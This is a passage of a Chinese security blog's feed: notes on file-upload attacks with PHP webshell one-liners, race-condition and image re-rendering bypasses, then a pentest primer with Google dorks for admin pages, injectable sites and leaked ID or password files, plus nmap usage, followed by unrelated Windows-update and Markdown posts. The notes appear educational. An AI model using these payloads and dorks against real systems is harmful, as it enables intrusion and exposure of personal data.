eval($_REQUEST[1]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li><li><ol><li>需要条件竞争大量快速上传木马到服务器<br>如果不够快 母马就会被 kill 掉</li></ol></li><li><ol><li>母马需要被解析(条件竞争访问)<br>如果木马上传成功 但是没有访问就不会触发解析 不解析就没有任何作用</li></ol></li><li><ol><li>访问母马释放出来的子马即可 getshell</li></ol></li></ul><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作，所以普通的图片马都难逃被渲染的悲剧，那么有没有那种可以绕过渲染的图片呢?<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>( <span class="variable">$upload_file</span>);</span><br><span class="line"><span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>( <span class="variable">$upload_file</span>);</span><br><span class="line"><span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>( <span class="variable">$upload_file</span>);</span><br></pre></td></tr></table></figure></p><ol><li>GIF 头部不会被渲染<br>渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell即可</li><li>PNG 对应的脚本绕过<br>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者<strong>IDAT 数据块</strong></li><li>JPG<br>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试</li></ol><ul><li><p>渲染两次会返回正确木马</p></li><li><p>JPG坑点总结</p></li><li><ol><li>需要被imagecreatefromjpeg渲染或再用工具</li></ol></li><li><ol><li>图片找的稍微大一点成功率更高 </li></ol></li><li><ol><li>Payload语句越短成功率越高</li></ol></li><li><ol><li>一张图片不行就换一张不要死磕</li></ol></li><li><ol><li>国光补充:貌似白色的图片成功率也比较高</li></ol></li><li><ol><li>&lt;?php $_GET<a href="$_POST[1]">0</a>;?&gt; 这种payload成功率很高</li></ol></li></ul><h3 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h3><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="网络安全" scheme="http://chalnl.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络安全" scheme="http://chalnl.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="文件上传漏洞" scheme="http://chalnl.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试基础</title>
    <link href="http://chalnl.com/post/23577.html/"/>
    <id>http://chalnl.com/post/23577.html/</id>
    <published>2022-08-07T16:00:00.000Z</published>
    <updated>2022-08-17T02:17:04.400Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="渗透测试基础"><a href="#渗透测试基础" class="headerlink" title="渗透测试基础"></a>渗透测试基础</h1><p>渗透测试(Penetration Testing)是指受信任的第三方通过模拟黑客的攻击技术与手段对目标网络、系统进行攻击测试，发现目标的安全隐患并给出安全加固建议的一种安全测试与评估方法。</p><h2 id="信息收集技术"><a href="#信息收集技术" class="headerlink" title="信息收集技术"></a>信息收集技术</h2><p>信息收集是渗透测试的第一阶段。在这个阶段，渗透人员需要使用各种方法尽可能地获取到目标资产的相关信息。渗透测试人员可以使用诸如百度或者谷歌这类的传统式搜索引擎来收集信息，也可以借助如<strong>Shodan、Zoomeye</strong>或者<strong>FQFA</strong>这类的物联网搜索引擎，甚至还可以直接使用本地的工具对目标资产进行<strong>操作系统探测、端口扫描、Webr目录扫描、Web指纹识别</strong>等。收集的信息越多，渗透测试成功的概率越高，所以业内常流传着这样一句话“<strong>渗透测试的本质就是信息收集</strong>”。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>信息收集的方式可以分为两种:<strong>主动</strong>和<strong>被动</strong>。</p><ol><li>主动:通过直接访问、扫描网站，这种将流量流经网站的行为。（缺点  会留下痕迹）</li><li>被动:利用第三方暴露在外，主要是互联网的信息进行收集。</li></ol><h3 id="常规收集"><a href="#常规收集" class="headerlink" title="常规收集"></a>常规收集</h3><ul><li><strong>备份文件泄露</strong><br><strong>通过对目录扫描</strong><br>备份文件与缓存文件泄露</li><li><strong>robots.txt泄露</strong></li></ul><h3 id="从信息泄密到未授权访问"><a href="#从信息泄密到未授权访问" class="headerlink" title="从信息泄密到未授权访问"></a>从信息泄密到未授权访问</h3><ul><li><strong>端口扫描与目录扫描</strong><br>开放某些敏感端口，通过burp爆破，遍历搜寻到网站敏感文件</li></ul><h3 id="内网收集"><a href="#内网收集" class="headerlink" title="内网收集"></a>内网收集</h3><ul><li><strong>内网服务器邮箱记录</strong></li><li><strong>浏览器保存密码记录</strong><br>将密码的表单（<strong>密码的类型type</strong>）破坏掉会看到正常的密码显示</li><li><strong>ESXI认证</strong><br>运维管理员登录</li><li><strong>hosts,bash_history等</strong><br>Linux中历史命令记录 ~/.bash_history</li></ul><hr><h2 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h2><p>在渗透测试过程中第一步就是信息收集，由于传统的信息收集工具包括指纹识别、目录扫描器等会留下痕迹，某些情况下还会被拦截，因此Google Hack能<strong>在不惊动目标服务器的情况下，对目标网站进行前期最重要的信息收集,并且尽可能的获得更多的信息</strong></p><ul><li><strong>谷歌语法</strong></li></ul><div class="table-container"><table><thead><tr><th>关键词</th><th>说明</th></tr></thead><tbody><tr><td>+</td><td>强制包含某个字符进行查询</td></tr><tr><td>-</td><td><strong>查询的时候忽略某个字符</strong></td></tr><tr><td>“”</td><td>精确匹配双引号内的字符</td></tr><tr><td>*</td><td>匹配任意字符进行查询</td></tr><tr><td>site：</td><td><strong>指定域名</strong></td></tr><tr><td>intext</td><td>正文中存在关键词的网页</td></tr><tr><td>intitle</td><td><strong>标题中存在关键词的网页</strong></td></tr><tr><td>inurl</td><td>URL中存在关键词的网页</td></tr><tr><td>filetype</td><td>搜索指定文件类型</td></tr></tbody></table></div><ul><li><p>寻找后台<br>intitle:后台登录<br>inurl:login |admin|manage |member|admin_login|login_admin|system /login|user|main | cmsinutl: houtai.php | houtai.asp<br>intext:管理|后台|登陆|用户名|密码|系统|帐号</p></li><li><p>查找文件上传点<br>inurl:admin/upfile.asp<br>inurl:admin/upload.asp<br>inurl:Richwidgets/Popup_Upload.aspx</p></li><li><p>查找目录遍历站点<br>intitle : “index of”</p></li><li><p>寻找存在注入的PHP站点 （SQL注入）<br>inurl: “.php?id=” “You have an error in your SQL syntax”</p></li><li><p>寻找互联网上的登录口<br>intitle:登录</p></li><li><p>寻找网站后台<br>intitle:后台登录<br>inurl:login|admin|manage/memberladmin_login|login_admin |system /login |user[main | cmsinutl: houtai.php | houtai.asp<br>inurl:login|admin|manage/memberladmin_login|login_admin |system /login |user[main | cmsinutl: houtai.php | houtai.asp</p></li></ul><h2 id="Google-Hacking-Database"><a href="#Google-Hacking-Database" class="headerlink" title="Google Hacking Database"></a>Google Hacking Database</h2><p>谷歌黑客漏洞<a href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database</a></p><ul><li>找互联网上带有身份证号的敏感文件<br>泄密：<strong>filetype指定搜索类型</strong> xls xlsx pdf doc docx<br>身份证 filetype:xlsx  /  filetype:xlsx 服务器密码</li><li>搜索百度公司相关的登录口</li><li>寻找有漏洞的PHPMyAdmin<br>inurl:/phpmyadmin/index.php 2.11.9.2</li></ul><h2 id="物联网搜索引擎"><a href="#物联网搜索引擎" class="headerlink" title="物联网搜索引擎"></a>物联网搜索引擎</h2><p>物联网搜索引擎也叫网络空间搜索引擎，是对全球网络空间基础设施或网络设备进行扫描，并可以对指纹特征检索的平台。</p><h3 id="Shodan-https-shodan-io"><a href="#Shodan-https-shodan-io" class="headerlink" title="[Shodan] (https://shodan.io/)"></a>[Shodan] (<a href="https://shodan.io/">https://shodan.io/</a>)</h3><ul><li>基本语法</li></ul><div class="table-container"><table><thead><tr><th>关键词</th><th>说明</th></tr></thead><tbody><tr><td>net</td><td>搜索指定ip地址或者子网，c段</td></tr><tr><td>hostname</td><td>搜索指定的域名或者服务器</td></tr><tr><td>port</td><td>搜索开放指定端口的设备</td></tr><tr><td>org</td><td>搜索属于指定组织或者公司的设备</td></tr><tr><td>product</td><td>搜索运行指定产品或者软件操作系统的设备</td></tr><tr><td>version</td><td>指定软件的版本</td></tr><tr><td>isp</td><td>搜索指定isp供应商的设备</td></tr><tr><td>country</td><td>搜索指定国家的设备</td></tr><tr><td>city</td><td>搜索指定城市的设备</td></tr></tbody></table></div><ul><li>应用实例</li></ul><ol><li>查找位于国内的Nginx服务器<br>nginx country:cn</li><li>搜索位南京开启3389端口的服务器<br>port: 3389 city:nanjing</li><li>搜索海康威视摄像头<br>Hikvision-webs country:cn city:nanjing</li><li>查看Cisco思科设备全球分布<br>isp:cisco<br>isp:cisco country:cn</li><li>查看华为设备全球分布<br>isp: huawei</li></ol><ul><li>JAWS摄像头</li><li>JAWS/1.0<h3 id="Zoomeye-https-zoomeye-org"><a href="#Zoomeye-https-zoomeye-org" class="headerlink" title="[Zoomeye] (https://zoomeye.org/)"></a>[Zoomeye] (<a href="https://zoomeye.org/">https://zoomeye.org/</a>)</h3><h3 id="Fofa-https-fofa-so"><a href="#Fofa-https-fofa-so" class="headerlink" title="[Fofa] (https://fofa.so/)"></a>[Fofa] (<a href="https://fofa.so/">https://fofa.so/</a>)</h3></li></ul><hr><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>域名爆破是指使用爆破字段拼接主域名尝试访问，暴力破解出主域名下是否还有其他子域名。例如通过某公司官网的主域名，可以暴力破解出该公司内部系统〈如OA、CRM等等）的访问地址。</p><ul><li>搜索引擎   (<strong>谷歌语法</strong>)<br>site: domain</li><li><a href="https://phpinfo.me/domain/">在线子域名查询</a></li><li><a href="https://crt.sh/">证书反查</a></li><li><strong>软件爆破</strong></li><li><ol><li>冷门子域名难以发现</li></ol></li><li><ol><li>2，,4，5,6级域名越来越多 ，爆破难度指数增加</li></ol></li></ul><hr><h2 id="C段与旁站"><a href="#C段与旁站" class="headerlink" title="C段与旁站"></a>C段与<strong>旁站</strong></h2><ul><li>C段也称为C类IP地址，<strong>外网渗透一般到C段</strong></li><li>C段默认子网掩码 255.255.255.0 覆盖ip地址较少</li><li>B类 255.255.0.0 ，A类 255.0.0.0<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3></li><li><strong>Fofa语法</strong>：ip”111.111.111.1/24” &amp;&amp; type=”subdomain”</li><li><strong>kali</strong>：nmap -p 80,8080 111.111.111.1/24</li><li><strong>serversan</strong>：在kali中使用较为方便 ，github上有开源</li></ul><h2 id="服务器信息查询"><a href="#服务器信息查询" class="headerlink" title="服务器信息查询"></a>服务器信息查询</h2><ul><li>DNS：提高解析速度，提高访问速度<br>114.114.114.114 中国通用<br>8.8.8.8 美国谷歌</li><li><strong>nslookup</strong> www.baidu.com<br>解析网站信息</li><li><strong>ping</strong> 测试<br>发包测试网络连通性<br><a href="https://www.aizhan.com/">爱站超级ping</a></li><li><strong>子域名绕过</strong><br>某些站点主站使用CDN，某些子域名未使用，结合之前的子域名爆破收集</li><li><strong>利用站点功能发起请求</strong></li><li><strong>利用网站漏洞</strong><br>某些敏感信息泄密回暴露相关信息</li><li><strong>解析查询历史记录</strong></li><li><strong>国外访问</strong><br>国外代理访问或者国外DNS解析，可能获得真实IP</li></ul><h2 id="社工信息收集"><a href="#社工信息收集" class="headerlink" title="社工信息收集"></a>社工信息收集</h2><ul><li><strong>whois查询</strong></li><li>Chrome查询<br><strong>inurl:t.me 社工库</strong></li><li>密码泄露查询</li><li>TG群信息收集<br>关键词 inurl:t.me</li><li>国家职业资格证查询<br><a href="http://www.ovta.org.cn/">link</a></li><li><strong><strong>GitHub信息搜集</strong></strong><br><del>password</del> 点到为止不多说 </li></ul><h2 id="Nmap-与-Masscan"><a href="#Nmap-与-Masscan" class="headerlink" title="Nmap 与 Masscan"></a>Nmap 与 Masscan</h2><h3 id="Nmap-官网"><a href="#Nmap-官网" class="headerlink" title="Nmap 官网"></a>Nmap <a href="https://nmap.org/">官网</a></h3><p>Nmap 的英文全称是”“”Nmap Network Mapper”，中文翻译过来就是“网络映射器”。Nmap是一款开源的端口扫描神器，它可以快速地扫描大型网络也可以扫描单个主机。<br>端口扫描是指人为发送一组端口扫描信息，试图以了解某台计算机的弱点，并了解其提供的计算机网络服务类型。</p><h4 id="端口介绍"><a href="#端口介绍" class="headerlink" title="端口介绍"></a>端口介绍</h4><ul><li><strong>TCP端口</strong><br>TCP是一种面向有连接的传输协议，只有确认通信对端存在时，才会发送数据，从而可以控制通信流量的浪费。同时，TCP还充分实现数据传输过程中的各种控制，可以再数据丢包的时候重发，还可以对次序乱掉的分包进行顺序控制。</li><li><strong>UDP端口</strong><br>UDP传输不提供复杂的控制机制，它利用IP提供面向无连接的通信服务。UDP报文没有可靠性保证，顺序保证，和流量控制，可靠性比较差，传输过程中即使出现包丢失也不会重发。也正是因为这些，它的资源消耗小，传输速度快，通常音频，视频在传送时用UDP传输较多。</li><li><strong><strong>协议端口</strong></strong><br>端口如同是一个房间的门，这个房间有多少个门呢?有65536个之多，也就是说端口的取值范围是0~65535个。本地操作系统会给那些有需求的进程分配协议端口，每个协议端口有一个正整数标识，如80、139、445等。</li></ul><div class="table-container"><table><thead><tr><th>端口号</th><th>协议</th><th>端口号</th><th>协议</th></tr></thead><tbody><tr><td>21</td><td>FTP</td><td>22</td><td>SSH</td></tr><tr><td>23</td><td>Tenet服务</td><td>25</td><td>SMTP邮件传输协</td></tr><tr><td>80</td><td>HTTP服务相关端口</td><td>110</td><td>POP3 E-mail</td></tr><tr><td>135</td><td>共享文件或共享打印机</td><td>443</td><td>HTTP服务相关常用端口SSL</td></tr><tr><td>445</td><td>文件或打印机共享服务</td><td>1433</td><td>MS SQL Server数据库</td></tr><tr><td>1521</td><td>Oracle 数据库</td><td>3306</td><td>MySQL数据库</td></tr><tr><td>3389</td><td>Windows远程桌面服务</td><td>5432/5433</td><td>PostgreSQL 数据库端口</td></tr><tr><td>6379</td><td>Redis存储默认端口</td><td>7001</td><td>Weblogic默认端口</td></tr><tr><td>8080</td><td>HTTP服务常用端口</td><td>8000-8100</td><td>HTTP服务常用端口</td></tr><tr><td>9200</td><td>Elasticsearch默认端口</td><td>11211</td><td>Memcached 分布式缓存系统端口</td></tr></tbody></table></div><h4 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h4><p>Nmap进行端口扫描的时候，Nmap会把扫描到的端口信息反馈回来，我们从反馈回来的信息就可以判断目标端口情况。<br>kali命令：nmap + 地址</p><div class="table-container"><table><thead><tr><th>状态</th><th>说明</th><th></th></tr></thead><tbody><tr><td>open</td><td>端口对外开放</td><td></td></tr><tr><td>Closed</td><td>端口对外关闭</td><td></td></tr><tr><td>Fitered</td><td>无法判断被防火墙设备拦截过滤</td><td></td></tr><tr><td>Unfiltered</td><td>无法判断被防火墙设备拦截过滤情况</td><td></td></tr><tr><td>Open\</td><td>Filtered</td><td>不能确定开放或者过滤可能被专业设备阻止</td></tr><tr><td>Closed\</td><td>Filtered</td><td>不能确定关闭还是被过滤</td></tr></tbody></table></div><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><div class="table-container"><table><thead><tr><th>选项</th><th>解释</th></tr></thead><tbody><tr><td>-sP</td><td>Ping 扫描</td></tr><tr><td>-PO/-Pn</td><td>无 Ping 扫描</td></tr><tr><td>-PS</td><td>TCP SYN Ping 扫描</td></tr><tr><td>-PA</td><td>TCP ACK Ping 扫描</td></tr><tr><td>-PU</td><td>UDP Ping 扫描</td></tr><tr><td>-PE;-PP;-PM</td><td>ICMP Ping Types扫描</td></tr><tr><td>-PR</td><td>ARP Ping 扫描</td></tr><tr><td>-sL</td><td>列表扫描</td></tr><tr><td>-6</td><td>扫描IPv6地址</td></tr><tr><td>—traceroute</td><td>路由跟踪</td></tr><tr><td>-PY</td><td>SCTP INIT Ping扫描</td></tr></tbody></table></div><h4 id="指纹探测"><a href="#指纹探测" class="headerlink" title="指纹探测"></a>指纹探测</h4><p>Nmap 不仅是一款端口扫描工具，还可以对主机的服务及版本进行识别和探测。<br>命令表:</p><div class="table-container"><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-sV</td><td>版本探测</td></tr><tr><td>-A</td><td>更加详细直观的扫描</td></tr><tr><td>—version-intensity</td><td>设置扫描强度1~9默认为7</td></tr><tr><td>—version-light</td><td>轻量级扫描强度为2</td></tr><tr><td>—version-all</td><td>重量级扫描强度为9</td></tr><tr><td>-O</td><td>启用操作系统探测</td></tr></tbody></table></div><ul><li>可以使用—oacket-trace查看协议扫描的细节:</li><li>~ nmap 10.20.24.15 —packet-trace</li><li>可以使用-v查看详细地输出，漫长的扫描的过程就不会显得那么枯燥，而且可以提升逼格。<br>~nmap 10.20.24.15 -v</li></ul><h4 id="使用Zenmap进行扫描"><a href="#使用Zenmap进行扫描" class="headerlink" title="使用Zenmap进行扫描"></a>使用Zenmap进行扫描</h4><p>Zenmap是Nmap官方的图形化界面，比较方便初学者使用的同时也提供了很多高级特性</p><h4 id="时间摸版"><a href="#时间摸版" class="headerlink" title="时间摸版"></a>时间摸版</h4><p>在Nmap提供了一些简单的方法，使用6个时间模板，使用时采用“T选项及数字(0-5)或名称。模板名称有paranoid (0)、 sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)</p><div class="table-container"><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-TO偏执的</td><td>非常慢，用于IDS躲避</td></tr><tr><td>-T1鬼祟的</td><td>缓慢的扫描，用于IDS躲避</td></tr><tr><td>-T2文雅的</td><td>降低了扫描速度以使用更少的带宽和目标主机资源</td></tr><tr><td>-T3普通的</td><td>默认模式根据目标的反应自动调整时间</td></tr><tr><td>-T4野蛮的</td><td>假设用户具有可靠的网络从而加速扫描，可能会漏扫</td></tr><tr><td>-T5疯狂的</td><td>极速扫描，为了获得速度而牺牲准确性</td></tr></tbody></table></div><h3 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h3><p>项目地址:<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><h4 id="实用正则"><a href="#实用正则" class="headerlink" title="实用正则"></a>实用正则</h4><h4 id="GOBY-提高探测深度"><a href="#GOBY-提高探测深度" class="headerlink" title="GOBY  提高探测深度"></a>GOBY  提高探测深度</h4><p>官网:<a href="https://cn.gobies.org/">https://cn.gobies.org/</a><br>新一代网络安全技术，通过为目标建立完整的资产数据库，实现快速的安全应急。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="网络安全" scheme="http://chalnl.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络安全" scheme="http://chalnl.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="信息搜集" scheme="http://chalnl.com/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>取消Windows自动更新</title>
    <link href="http://chalnl.com/post/39462.html/"/>
    <id>http://chalnl.com/post/39462.html/</id>
    <published>2022-07-17T16:00:00.000Z</published>
    <updated>2022-08-16T13:11:49.188Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>你是不是也常为 win10/win11 弹出的自动更新感到烦恼</p><p>今天帮你彻底解决这个问题</p></blockquote><ul><li>首先介绍一下为什么要关闭系统的自动更新 （当然，系统不完善，有重要的更新是可以手动去更新的）<ol><li>我想没有人会喜欢一个每次开机都会弹更新的电脑吧。</li><li>再者我觉得电脑的自动更新就很讨厌。</li><li>减少硬盘的空间占用。</li><li>还有较为重要的一点，你有没有碰到刚更新完就蓝屏开不了机的情况呢，严重会让你的重要数据损失，是不是很可怕呢。</li><li>还有一个听闻，也不知道是不是真的，某公司为了让硬件的更新换代，会在某次系统更新的时候后淘汰一批硬件，这样给系统更新之后会直接很大的程度上损坏你的硬件设施。</li></ol></li></ul><ol><li><p>关闭Windows自动更新服务</p><p>win+r ——-输入services.msc(服务管理窗口)</p></li></ol><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57vuk4sztj30ma08i79e.jpg" alt="image.png"></p><p>   停止windows update服务  并禁用</p><blockquote><p>以为禁用就完了吗，不不不</p></blockquote><ol><li>同时在恢复改为无操作</li></ol><p><img src="C:/Users/Chalnl/AppData/Roaming/Typora/typora-user-images/image-20220815234800460.png" alt="image-20220815234800460"></p><blockquote><p>你不会以为这样就能完全关闭了吧  还有最后一步哦</p></blockquote><ol><li><p>win+r ——-输入 gpedit.msc (本地组策略编辑器)</p><p>管理摸版 - - &gt; Windows组件 - - &gt; Windows更新 - - &gt; 禁用配置自动更新</p></li></ol><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57vzgqzhij30rp0epn6t.jpg" alt="image.png"></p><blockquote><p>到此，完全关闭 win10/win11 系统的自动更新了</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="配置" scheme="http://chalnl.com/tags/%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>Markdown语法</title>
    <link href="http://chalnl.com/post/3c50d03d.html/"/>
    <id>http://chalnl.com/post/3c50d03d.html/</id>
    <published>2022-06-07T16:00:00.000Z</published>
    <updated>2022-08-17T15:35:14.017Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Markdown语法总结"><a href="#Markdown语法总结" class="headerlink" title="Markdown语法总结"></a>Markdown语法总结</h1><h2 id="Markdown简介"><a href="#Markdown简介" class="headerlink" title="Markdown简介"></a>Markdown简介</h2><p>学习当然首先要知道Markdown是什么，在菜鸟教程中给出Markdown的定义如下：</p><blockquote><p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档。</p><p>Markdown 语言在 2004 由约翰·格鲁伯（英语：John Gruber）创建。</p><p>Markdown 编写的文档可以导出 HTML 、Word、图像、PDF、Epub 等多种格式的文档。</p><p>Markdown 编写的文档后缀为 <strong>.md</strong>, <strong>.markdown</strong>。</p></blockquote><p>我个人编写Markdown时候使用的工具是<strong>Typora</strong> 和<strong>有道云</strong> 笔记，在其<a href="https://www.typora.io/">官网</a>可以进行下载</p><p>既然使用的是菜鸟教程，接下来将会使用菜鸟教程中的结构进行学习总结，教程链接为：<a href="https://www.runoob.com/markdown/md-tutorial.html">link</a></p><h2 id="Markdown标题"><a href="#Markdown标题" class="headerlink" title="Markdown标题"></a>Markdown标题</h2><h4 id="1-使用-进行标记标记标题"><a href="#1-使用-进行标记标记标题" class="headerlink" title="1. 使用 # 进行标记标记标题"></a>1. 使用 # 进行标记标记标题</h4><p># 可以标记1-6级标题，每级标题对应相应个数的 # ，如下所示：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h2 id="Markdown段落格式"><a href="#Markdown段落格式" class="headerlink" title="Markdown段落格式"></a>Markdown段落格式</h2><h4 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h4><p>Markdown段落没有特殊的格式，直接编写文字就好，段落的换行是使用两个以上的空格加上回车，或者使用空行来换行。</p><h4 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h4><p>Markdown中可以使用以下字体样式：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="emphasis">*斜体文本*</span></span><br><span class="line"><span class="emphasis">_斜体文本_</span></span><br><span class="line"><span class="strong">**粗体文本**</span></span><br><span class="line"><span class="strong">__粗体文本__</span></span><br><span class="line"><span class="strong">**<span class="emphasis">*粗斜体文本*</span>**</span></span><br><span class="line"><span class="strong">__<span class="emphasis">_粗斜体文本_</span>__</span></span><br><span class="line">==强调文本==</span><br><span class="line"><span class="code">`阴影文本`</span></span><br><span class="line">~~删除线文本~~</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>下划线文本<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p><em>斜体文本</em><br><em>斜体文本</em><br><strong>粗体文本</strong><br><strong>粗体文本</strong><br><strong><em>粗斜体文本</em></strong><br><strong><em>粗斜体文本</em></strong><br>==强调文本==<br><code>阴影文本</code><br><del>删除线文本</del><br><u>下划线文本</u></p><p>也就是 * 和 _ 其实是等价的，1个为倾斜，2个为加粗，3个为加粗倾斜，另外强调、删除线和下划线也在这里进行了总结</p><h4 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h4><p>在一行中用3个及以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西，但可以在星号或是减号中间插入空格，如下所示：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"></span></span></span><br><span class="line"><span class="emphasis"><span class="strong">*</span> <span class="emphasis">* *</span></span></span><br><span class="line"><span class="strong"></span></span><br><span class="line"><span class="strong">**</span><span class="strong">**<span class="emphasis">*</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"></span></span></span><br><span class="line"><span class="emphasis"><span class="strong">- - -</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"></span></span></span><br><span class="line"><span class="emphasis"><span class="strong">----------</span></span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><hr><hr><hr><hr><hr><h4 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h4><p>脚注是对文本的补充说明，感觉皮一下很有意思，脚注格式如下所示：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">创建脚注格式类似这样 [^RUNOOB]。</span><br><span class="line"></span><br><span class="line">[<span class="symbol">^RUNOOB</span>]: <span class="link">菜鸟教程 -- 学的不仅是技术，更是梦想！！！</span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p>创建脚注格式类似这样 <sup><a href="#fn_RUNOOB" id="reffn_RUNOOB">RUNOOB</a></sup>。</p><blockquote id="fn_RUNOOB"><sup>RUNOOB</sup>. 菜鸟教程 — 学的不仅是技术，更是梦想！！！<a href="#reffn_RUNOOB" title="Jump back to footnote [RUNOOB] in the text."> &#8617;</a></blockquote><p>这个以前没有用过，感觉很有意思，上次看到类似这种的<a href="read://https_blog.csdn.net/?url=https%3A%2F%2Fblog.csdn.net%2Fu011315681%2Farticle%2Fdetails%2F120144013%3Fspm%3D1001.2014.3001.5502#fn1">1</a></p><p>在CSDN中介绍了关于注释的使用方法，但是似乎在Typora中并不支持，此处仅仅作为记录，如下所示：</p><blockquote><p>Markdown将文本转换为 